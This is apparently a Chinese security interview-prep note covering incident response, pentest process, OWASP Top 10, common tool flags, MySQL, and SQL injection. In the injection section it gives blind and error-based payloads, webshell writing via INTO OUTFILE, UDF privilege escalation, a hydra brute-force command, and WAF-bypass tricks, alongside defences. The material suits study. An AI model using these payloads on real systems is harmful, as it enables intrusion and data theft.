<h3 id="DJANGO和FLASK区别和使用"><a href="#DJANGO和FLASK区别和使用" class="headerlink" title="DJANGO和FLASK区别和使用"></a>DJANGO和FLASK区别和使用</h3><h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><h3 id="python安全工具编写-源码阅读"><a href="#python安全工具编写-源码阅读" class="headerlink" title="python安全工具编写/源码阅读"></a>python安全工具编写/源码阅读</h3><h3 id="证明能力"><a href="#证明能力" class="headerlink" title="证明能力"></a>证明能力</h3><ul>
<li>python安全工具开发</li>
<li>python项目，记一下技术细节</li>
</ul>
<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h3 id="国内SM系列"><a href="#国内SM系列" class="headerlink" title="国内SM系列"></a>国内SM系列</h3><h2 id="风险评估"><a href="#风险评估" class="headerlink" title="风险评估"></a>风险评估</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="https://i.loli.net/2018/03/09/5aa223dbc8662.jpg" alt></p>
<h3 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h3><ul>
<li>资产：资产价值</li>
<li>威胁：威胁主体、影响对象、出现频率、动机等</li>
<li>脆弱性：资产弱点的严重程度‘</li>
</ul>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="Fority-SCA审计JAVA代码"><a href="#Fority-SCA审计JAVA代码" class="headerlink" title="Fority SCA审计JAVA代码"></a>Fority SCA审计JAVA代码</h3><p>fortify用到什么模块? 过滤器 自定义规则 生成报告</p>
<h3 id="Seay审计PHP代码"><a href="#Seay审计PHP代码" class="headerlink" title="Seay审计PHP代码"></a>Seay审计PHP代码</h3><h3 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h3><h2 id="应急响应具体流程"><a href="#应急响应具体流程" class="headerlink" title="应急响应具体流程"></a>应急响应具体流程</h2><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/26542790" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26542790</a></p>
</blockquote>
<p>PDCERF模型</p>
<ul>
<li>Prepare（准备）：准备用来检测的工具和人</li>
<li>Detection（检测）：紧急事件监测：包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告</li>
<li>Containment（抑制）：首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到更张水平</li>
<li>Eradication（根除）</li>
<li>Recover（恢复）</li>
<li>Follow-Up（跟踪）：根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h4><h5 id="DDOS是什么"><a href="#DDOS是什么" class="headerlink" title="DDOS是什么"></a>DDOS是什么</h5><p>分布式拒绝服务攻击（DDoS）是目前黑客经常采用而难以防范的攻击手段。DoS的攻击方式有很多种，最基本的DoS攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。</p>
<p>DDOS攻击手段是在传统的DOS攻击基础之上产生的一类攻击方式。单一的DOS攻击一般是采用一对一方式的，当攻击目标CPU速度低、内存小或者网络带宽小等等各项性能指标不高它的效果是明显的。随着计算机与网络技术的发展，计算机的处理能力迅速增长，内存大大增加，同时也出现了千兆级别的网络，这使得DOS攻击的困难程度加大了——目标对恶意攻击包的“消化能力”加强了不少，例如你的攻击软件每秒钟可以发送3,000个攻击包，但我的主机与网络带宽每秒钟可以处理10,000个攻击包，这样一来攻击就不会产生什么效果这时侯分布式的拒绝服务攻击手段（DDOS）就应运而生了。</p>
<p>如果说计算机与网络的处理能力加大了10倍，用一台攻击机来攻击不再能起作用的话，攻击者使用10台攻击机同时攻击呢？用100台呢？DDOS就是利用更多的傀儡机来发起进攻，以比从前更大的规模来进攻受害者。通常，被攻击的服务器有以下症状：1、被攻击主机上有大量等待的TCP连接；2、网络中充斥着大量的无用的数据包，源地址为假；3、制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯；4、利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求；5、严重时会造成系统死机</p>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>我司网站<a href="http://www.catroot.cn的IP" target="_blank" rel="noopener">www.catroot.cn的IP</a>  223.223.223.223 被人DDOS攻击，流量达9G，并且机房流量清洗无效，所以把223.223.223.223封停，导致网站不能访问，请作出紧急预案。</p>
<blockquote>
<p><a href="https://www.zhihu.com/question/19581905" target="_blank" rel="noopener">https://www.zhihu.com/question/19581905</a></p>
</blockquote>
<ul>
<li>网络设备设施<ul>
<li>拼带宽，加大带宽，但是成本太高</li>
<li>使用硬件防火墙</li>
<li>选用高性能设备</li>
</ul>
</li>
<li>抗D思想和方案<ul>
<li>负载均衡</li>
<li>花钱买流量清洗服务</li>
<li>CDN：web层，比如cc攻击</li>
<li>分布式集群防御</li>
<li>高防：防大部分攻击，udp、大型的cc攻击</li>
</ul>
</li>
<li>预防为主<ul>
<li>系统漏洞</li>
<li>系统资源优化：</li>
<li>过滤不必要的服务和端口</li>
<li>限制特定流量：检查访问来源做适当限制</li>
</ul>
</li>
</ul>
<h4 id="主机被入侵"><a href="#主机被入侵" class="headerlink" title="主机被入侵"></a>主机被入侵</h4><ol>
<li>优先提取易消失的数据<ul>
<li>内存信息</li>
<li>系统进程<code>free -m</code></li>
<li>路由信息<code>tracert</code></li>
</ul>
</li>
<li><code>ifconfig</code>查看网卡流量，检查网卡的发送、接收数据情况</li>
<li><code>NetHogs</code>实时监控带宽占用状况</li>
<li>查看Linux系统日志 <code>/var/log</code></li>
<li><code>ClamAV</code>杀毒软件</li>
</ol>
<h2 id="渗透测试流程相关"><a href="#渗透测试流程相关" class="headerlink" title="渗透测试流程相关"></a>渗透测试流程相关</h2><h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3><ol>
<li>项目访谈</li>
<li>信息收集：whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息</li>
<li>漏洞扫描：Nessus, AWVS</li>
<li>手动挖掘：逻辑漏洞</li>
<li>验证漏洞</li>
<li>修复建议</li>
<li>（如果有）基线检查/复验漏洞</li>
<li>输出报告<ul>
<li>概述</li>
<li>测试基本信息<ul>
<li>测试范围</li>
<li>测试时间</li>
<li>测试任务</li>
<li>测试过程</li>
</ul>
</li>
<li>信息安全风险综合分析<ul>
<li>整体风险分析</li>
<li>风险影响分析</li>
<li>系统安全分析</li>
<li>安全漏洞列表</li>
</ul>
</li>
<li>解决方案建议</li>
<li>复测报告</li>
</ul>
</li>
</ol>
<h3 id="渗透测试项目"><a href="#渗透测试项目" class="headerlink" title="渗透测试项目"></a>渗透测试项目</h3><p>用七八句话概括一下发现、验证漏洞细节、扮演角色、具体工作。<br>如果技术人员有兴趣会继续问，接着再引导到别处，让自己多说说细节。</p>
<h3 id="渗透测试具体实施"><a href="#渗透测试具体实施" class="headerlink" title="渗透测试具体实施"></a>渗透测试具体实施</h3><h3 id="17年OWASP-TOP10"><a href="#17年OWASP-TOP10" class="headerlink" title="17年OWASP TOP10"></a>17年OWASP TOP10</h3><ul>
<li>注入:sql,nosql,ldap,os</li>
<li>失效的身份认证: </li>
<li>敏感信息泄漏</li>
<li>XXE XML外部实体</li>
<li>失效的访问控制：管理页面仅能管理员权限访问；越权漏洞</li>
<li>安全配置错误：页面错误信息，默认密码，使用已知漏洞的应用</li>
<li>XSS</li>
<li>不安全的反序列化：一个PHP论坛使用PHP对象序列化来保存一个cookie，用户修改cookie即可伪造管理员登陆</li>
<li>使用含有已知漏洞的组件：比如structs2框架</li>
<li>不足的日志记录和监控：代码被删除，无法溯源；记录登陆失败次数；监控问题没被管理员响应</li>
</ul>
<h3 id="常见的Web安全漏洞"><a href="#常见的Web安全漏洞" class="headerlink" title="常见的Web安全漏洞"></a>常见的Web安全漏洞</h3><ul>
<li>SQL注入</li>
<li>XSS</li>
<li>文件遍历、文件上传、文件下载</li>
<li>垂直越权、水平越权</li>
<li>逻辑漏洞</li>
</ul>
<h3 id="挖过什么逻辑漏洞"><a href="#挖过什么逻辑漏洞" class="headerlink" title="挖过什么逻辑漏洞"></a>挖过什么逻辑漏洞</h3><h4 id="订单任意金额修改"><a href="#订单任意金额修改" class="headerlink" title="订单任意金额修改"></a>订单任意金额修改</h4><p>相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。</p>
<p>预防思路：</p>
<ul>
<li>订单需要多重效验<br><img src="http://image.3001.net/images/20160819/14715932566558.png" alt></li>
<li>订单数值较大的时候需要人工审核</li>
</ul>
<h4 id="验证码回传"><a href="#验证码回传" class="headerlink" title="验证码回传"></a>验证码回传</h4><p>漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件</p>
<p>预防思路：</p>
<ul>
<li>response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加</li>
<li>如果要进行前端验证的话也可以，但是需要进行加密</li>
</ul>
<h4 id="未进行登陆凭证验证"><a href="#未进行登陆凭证验证" class="headerlink" title="未进行登陆凭证验证"></a>未进行登陆凭证验证</h4><p>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没验证ID或cookie验证导致越权。</p>
<p>预防思路：</p>
<ul>
<li>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证</li>
</ul>
<h4 id="接口无限制枚举"><a href="#接口无限制枚举" class="headerlink" title="接口无限制枚举"></a>接口无限制枚举</h4><ul>
<li>某电商登陆接口无验证导致撞库</li>
<li>某招聘网验证码无限制枚举</li>
<li>某快递公司优惠券枚举</li>
<li>某电商会员卡卡号枚举</li>
</ul>
<p>预防思路：</p>
<ul>
<li><p>在输入接口设置验证，如token，验证码等。如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。</p>
</li>
<li><p>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。</p>
</li>
<li><p>验证码不要用短数字，尽量6位以上，最好是以字母加数字进行组合，并且验证码需要设定时间期限。</p>
</li>
<li><p>优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合。</p>
</li>
</ul>
<h4 id="cookie设置存在缺陷"><a href="#cookie设置存在缺陷" class="headerlink" title="cookie设置存在缺陷"></a>cookie设置存在缺陷</h4><ul>
<li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举.</li>
<li>cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证</li>
<li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法</li>
<li>越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限</li>
</ul>
<p>预防思路</p>
<ol>
<li>cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。</li>
<li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。</li>
<li>用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。</li>
<li>cookie中设定session参数，以防cookie可以长时间生效。</li>
<li>根据业务不同还有很多方法</li>
</ol>
<h3 id="找回密码功能缺陷"><a href="#找回密码功能缺陷" class="headerlink" title="找回密码功能缺陷"></a>找回密码功能缺陷</h3><ol start="2">
<li>单纯读取内存值作为用户凭证</li>
<li>电商系统加车、下单漏洞</li>
</ol>
<h3 id="你常用的渗透工具有哪些，最常用的是哪个？"><a href="#你常用的渗透工具有哪些，最常用的是哪个？" class="headerlink" title="你常用的渗透工具有哪些，最常用的是哪个？"></a>你常用的渗透工具有哪些，最常用的是哪个？</h3><h4 id="扫描-Nessus-AWVS-Nikto"><a href="#扫描-Nessus-AWVS-Nikto" class="headerlink" title="扫描:Nessus,AWVS,Nikto"></a>扫描:Nessus,AWVS,Nikto</h4><h4 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h4><blockquote>
<p><a href="https://blog.csdn.net/ski_12/article/details/58188331" target="_blank" rel="noopener">https://blog.csdn.net/ski_12/article/details/58188331</a></p>
</blockquote>
<p>常用参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-u 单个URL -m xx.txt 多个URL</span><br><span class="line">-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;  作为服务器客户端，直接连接数据库</span><br><span class="line">--data post/get都适用</span><br><span class="line">-p 指定扫描的参数</span><br><span class="line">-r 读取文件</span><br><span class="line">-f 指纹信息</span><br><span class="line">--tamper 混淆脚本，用于应用层过滤</span><br><span class="line">--cookie --user-agent --host等等http头的修改</span><br><span class="line">--threads 并发线程 默认为1</span><br><span class="line">--dbms MySQL&lt;5.0&gt; 指定数据库或版本</span><br><span class="line"></span><br><span class="line">–level=LEVEL 执行测试的等级（1-5，默认为 1）</span><br><span class="line">–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险</span><br><span class="line">–current-db / 获取当前数据库名称</span><br><span class="line">–dbs 枚举数据库管理系统数据库</span><br><span class="line">–tables 枚举 DBMS 数据库中的表</span><br><span class="line">–columns 枚举 DBMS 数据库表列</span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br></pre></td></tr></table></figure>

<p>常用的tamper</p>
<blockquote>
<p>本地：sqlmap-tamper分类.xlsx</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64encode.py #转为b64编码</span><br><span class="line">charencode.py url编码</span><br><span class="line">chardoubleencode.py 双URL编码</span><br><span class="line">unmagicquotes.py 宽字节</span><br><span class="line">randomcomments.py 用/**/分割SQL关键字</span><br><span class="line">space2plus.py space2comment.py space2xxxx.py 替换空格为xx</span><br></pre></td></tr></table></figure>

<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap hostname/ip或者多个ip或者子网192.168.123.*</span><br><span class="line">-iL ip.txt 扫描ip.txt的所有ip</span><br><span class="line">-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描</span><br><span class="line">-O 探测操作系统信息</span><br><span class="line">-sV 查找主机服务版本号</span><br><span class="line">-sA 探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">-sS 半开扫描，一般不会记入日志，不过需要root权限。</span><br><span class="line">-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。</span><br><span class="line">-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。</span><br><span class="line">-sN TCP空扫描</span><br><span class="line">-F 快速扫描</span><br><span class="line">-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。</span><br><span class="line">-p 指定端口/端口范围</span><br><span class="line">-oN 将报告写入文件</span><br><span class="line">-v 详细信息</span><br><span class="line">-T&lt;0-5&gt; 设定速度</span><br></pre></td></tr></table></figure>
<p>Nmap还可以用到爆破等一些脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--script all 使用所有脚本</span><br><span class="line">--script=sql.injection.nse sql注入</span><br><span class="line">--script=&quot;smb*&quot;  扫smb系列</span><br></pre></td></tr></table></figure>


<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>使用内置模块。HR：常用的模块有哪些？<br>tcp反向链接 msfvenom</p>
<h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><p>密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">hydra IP -l loginname -P pass.txt PROTROCL</span><br><span class="line">hydra 127.0.0.1 -l root -P pass.txt ssh</span><br></pre></td></tr></table></figure>

<h4 id="kali信息收集工具"><a href="#kali信息收集工具" class="headerlink" title="kali信息收集工具"></a>kali信息收集工具</h4><ul>
<li>dig</li>
<li>whois</li>
<li>host:查询dns服务器</li>
<li>nslookup</li>
<li>域名枚举：fierse -dns</li>
<li>maltego</li>
<li>onesixtyone</li>
</ul>
<h4 id="流量分析WireShark"><a href="#流量分析WireShark" class="headerlink" title="流量分析WireShark"></a>流量分析WireShark</h4><p>CTF</p>
<h3 id="描述一个你深入研究过的CVE或POC-ms17-010-最新的CVE"><a href="#描述一个你深入研究过的CVE或POC-ms17-010-最新的CVE" class="headerlink" title="描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)"></a>描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)</h3><h2 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h2><blockquote>
<p><a href="https://www.zhihu.com/question/22953267" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267</a></p>
</blockquote>
<h3 id="MySQL面试题"><a href="#MySQL面试题" class="headerlink" title="MySQL面试题"></a>MySQL面试题</h3><h4 id="MySQL存储引擎？"><a href="#MySQL存储引擎？" class="headerlink" title="MySQL存储引擎？"></a>MySQL存储引擎？</h4><ol>
<li>InnoDB：主流的存储引擎。支持事务、支持行锁、支持非锁定读、支持外键约束</li>
</ol>
<ul>
<li>为MySQL提供了具有提交、回滚和崩溃恢复能力的事物安全（ACID兼容）存储引擎。InnoDB锁定在行级并且也在 SELECT语句中提供一个类似Oracle的非锁定读。这些功能增加了多用户部署和性能。在SQL查询中，可以自由地将InnoDB类型的表和其他MySQL的表类型混合起来，甚至在同一个查询中也可以混合</li>
<li>InnoDB存储引擎为在主内存中缓存数据和索引而维持它自己的缓冲池。InnoDB将它的表和索引在一个逻辑表空间中，表空间可以包含数个文件（或原始磁盘文件）。这与MyISAM表不同，比如在MyISAM表中每个表被存放在分离的文件中。InnoDB表可以是任何尺寸，即使在文 件尺寸被限制为2GB的操作系统上</li>
<li>InnoDB支持外键完整性约束，存储表中的数据时，每张表的存储都按主键顺序存放，如果没有显示在表定义时指定主键，InnoDB会为每一行生成一个6字节的ROWID，并以此作为主键</li>
</ul>
<ol start="2">
<li>MyISAM：访问速度快，不支持事务，逐渐被淘汰</li>
<li>MEMORY：BTREE索引或者HASH索引。将表中数据放在内存中，并发性能差。<code>information_schema</code>用的是该引擎</li>
<li>MERGE、Archive等等不常用的</li>
</ol>
<h4 id="什么是事务？"><a href="#什么是事务？" class="headerlink" title="什么是事务？"></a>什么是事务？</h4><p>事务是一组原子性的SQL语句或者说是一个独立的工作单元，如果数据库引擎能够成功对数据库应用这组SQL语句，那么就执行，如果其中有任何一条语句因为崩溃或其它原因无法执行，那么所有的语句都不会执行。也就是说，事务内的语句，要么全部执行成功，要么全部执行失败。<br>举个银行应用的典型例子：</p>
<p>假设银行的数据库有两张表：支票表和储蓄表，现在某个客户A要从其支票账户转移2000元到其储蓄账户，那么至少需求三个步骤：</p>
<p>a.检查A的支票账户余额高于2000元；</p>
<p>b.从A的支票账户余额中减去2000元；</p>
<p>c.在A的储蓄账户余额中增加2000元。</p>
<p>这三个步骤必须要打包在一个事务中，任何一个步骤失败，则必须要回滚所有的步骤，否则A作为银行的客户就可能要莫名损失2000元，就出问题了。这就是一个典型的事务，这个事务是不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，不可能只执行其中一部分，这也是事务的原子性特征。</p>
<h4 id="读锁和写锁"><a href="#读锁和写锁" class="headerlink" title="读锁和写锁"></a>读锁和写锁</h4><p>读锁是共享的，即相互不阻塞的，多个客户在同一时刻可以读取同一资源，互不干扰。写锁是排他的，即一个写锁会阻塞其它的写锁和读锁，只有这样，才能确保给定时间内，只有一个用户能执行写入，防止其它用户读取正在写入的同一资源。写锁优先级高于读锁。</p>
<h4 id="MySQL的索引"><a href="#MySQL的索引" class="headerlink" title="MySQL的索引"></a>MySQL的索引</h4><p>索引是帮助MySQL高效获取数据的数据结构。MYISAM和InnoDB存储引擎只支持BTree索引；MEMORY和HEAP储存引擎可以支持HASH和BTREE索引。</p>
<h4 id="ORDER-BY在注入的运用"><a href="#ORDER-BY在注入的运用" class="headerlink" title="ORDER BY在注入的运用"></a>ORDER BY在注入的运用</h4><h4 id="GPC是什么？GPC之后怎么绕过？"><a href="#GPC是什么？GPC之后怎么绕过？" class="headerlink" title="GPC是什么？GPC之后怎么绕过？"></a>GPC是什么？GPC之后怎么绕过？</h4><p>如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。</p>
<h4 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h4><ul>
<li>@为用户变量，使用<code>SET @var1=1</code>赋值</li>
<li>@@ 为系统变量 ，包括全局变量<code>show global variables \G;</code>和会话变量<code>show session variables \G;</code></li>
</ul>
<h4 id="注入-绕过常用的函数"><a href="#注入-绕过常用的函数" class="headerlink" title="注入/绕过常用的函数"></a>注入/绕过常用的函数</h4><ol>
<li>基于布尔SQL盲注<ul>
<li><code>left(database(),1)&gt;&#39;s&#39;</code></li>
<li><code>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+</code></li>
<li><code>ascii(substr((select database()),1,1))=98</code></li>
<li><code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</code></li>
<li><code>regexp</code>正则注入 <code>select user() regexp &#39;^[a-z]&#39;;</code></li>
<li><code>select user() like &#39;ro%&#39;</code></li>
</ul>
</li>
<li>基于报错的SQL盲注<ul>
<li><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</code></li>
</ul>
</li>
</ol>
<h4 id="MySQL存储过程"><a href="#MySQL存储过程" class="headerlink" title="MySQL存储过程"></a>MySQL存储过程</h4><h4 id="各种写shell的问题"><a href="#各种写shell的问题" class="headerlink" title="各种写shell的问题"></a>各种写shell的问题</h4><ol>
<li>写shell用什么函数？ <ul>
<li><code>select &#39;&lt;?php phpinfo()&gt; into outfile &#39;D:/shelltest.php&#39;</code></li>
<li><code>dumpfile</code></li>
<li><code>file_put_contents</code></li>
</ul>
</li>
<li>outfile不能用了怎么办？ <code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code>可以UDF提权 <a href="https://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/5444398.html</a></li>
<li>dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</li>
<li>sleep()能不能写shell？</li>
<li>写shell的条件？<ul>
<li>用户权限</li>
<li>目录读写权限</li>
<li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞 <a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="noopener">https://www.waitalone.cn/imagemagic-bypass-disable_function.html</a></li>
<li>open_basedir: 将用户可操作的文件限制在某目录下</li>
</ul>
</li>
</ol>
<h4 id><a href="#" class="headerlink" title></a></h4><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><ol>
<li>基于报错注入</li>
<li>基于布尔的注入，根据返回页面判断条件真假的注入</li>
<li>基于时间的盲注，不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>宽字节注入</li>
<li>联合查询，可以使用 union 的情况下的注入。</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ol>
<h3 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h3><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通常未经检查或者未经充分检查的用户输入数据或代码编写问题，意外变成了代码被执行。</p>
<h3 id="过waf"><a href="#过waf" class="headerlink" title="过waf"></a>过waf</h3><blockquote>
<p><a href="https://blog.csdn.net/wjy397/article/details/53263281" target="_blank" rel="noopener">https://blog.csdn.net/wjy397/article/details/53263281</a></p>
</blockquote>
<ol>
<li>确定waf类型，狗、盾、神、锁、宝、卫士</li>
<li>使用注释符号或者特殊符号或者多个特殊符号重复<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># </span><br><span class="line">--</span><br><span class="line">-- - //5.6.12特性，需要加空格</span><br><span class="line">--+</span><br><span class="line">//</span><br><span class="line">/**/ //c风格注释</span><br><span class="line">/**//**/  //多个注释</span><br><span class="line">/*letmetest*/</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 科学记数法</span><br><span class="line">id=0e1union select</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 空白字符</span><br><span class="line">SQLite3 0A 0D 0C 09 20 </span><br><span class="line">MySQL5 09 0A 0B 0C 0D A0 20 </span><br><span class="line">PosgresSQL 0A 0D 0C 09 20 </span><br><span class="line">Oracle 11g 00 0A 0D 0C 09 20 </span><br><span class="line">MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br></pre></td></tr></table></figure></li>
<li>使用sql内置函数或者关键字<blockquote>
<p>报错注入 <a href="https://blog.csdn.net/like98k/article/details/79646512" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/79646512</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 常用</span><br><span class="line">extractvalue</span><br><span class="line">updatexml 报错注入</span><br><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">or updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; select * from  users where id = 1 and updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; version() database() (SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 0,1</span><br><span class="line"></span><br><span class="line">floor()</span><br><span class="line">ceil()</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">concat(version(),&apos;|&apos;,user());</span><br><span class="line">concat_ws(&apos;|&apos;,1,2,3)</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&apos;a&apos;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br></pre></td></tr></table></figure>


</li>
</ol>
<ol start="4">
<li>利用容器特性，比如iis+asp的环境可能会吞掉%(f%rom-&gt;from)造成注入，或者iis支持unicode解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf可能不会拦截造成注入</li>
<li>畸形协议/请求。asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式;php+apache解析协议除了get/post外随便定义协议也可能过</li>
<li>%0a换行</li>
<li>多次URL编码，waf的一根筋过滤<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unlencode</span><br><span class="line">base64</span><br><span class="line">json</span><br><span class="line">binary</span><br><span class="line">querystring</span><br><span class="line">htmlencode</span><br><span class="line">unicode</span><br><span class="line">php serialize</span><br></pre></td></tr></table></figure></li>
<li>http参数污染，<code>id=1&amp;id=2&amp;id=3</code> <code>id=1,2,3</code></li>
</ol>
<h3 id="如何进行SQL注入的防御"><a href="#如何进行SQL注入的防御" class="headerlink" title="如何进行SQL注入的防御"></a>如何进行SQL注入的防御</h3><ol>
<li><p>关闭应用的错误提示 </p>
</li>
<li><p>加waf</p>
</li>
<li><p>对输入进行过滤</p>
</li>
<li><p>限制输入长度</p>
</li>
<li><p>限制好数据库权限，drop/create/truncate等权限谨慎grant</p>
</li>
<li><p>预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。</p>
</li>
<li><p>数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md5</p>
</li>
